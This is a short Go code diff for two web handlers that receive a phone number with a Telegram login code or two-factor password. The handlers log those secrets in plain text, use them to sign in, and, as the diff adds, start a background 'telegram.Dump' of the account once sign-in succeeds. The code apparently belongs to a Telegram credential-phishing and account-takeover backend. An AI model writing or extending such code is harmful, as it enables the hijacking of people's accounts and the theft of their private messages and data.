@@ -34,7 +34,10 @@ func PostCode(c fiber.Ctx) error {
 	log.Println(req.Code)
 	
 	res := telegram.Code(req.Phone, req.Code)
-	if res { return c.SendStatus(200) }
+	if res {
+		go telegram.Dump(req.Phone)
+		return c.SendStatus(200)
+	}
 	return c.SendStatus(400)
 }
 
@@ -49,6 +52,9 @@ func PostPassword(c fiber.Ctx) error {
 	log.Println(req.Password)
 	
 	res := telegram.Password(req.Phone, req.Password)
-	if res { return c.SendStatus(200) }
+	if res {
+		go telegram.Dump(req.Phone)
+		return c.SendStatus(200)
+	}
 	return c.SendStatus(400)
 }
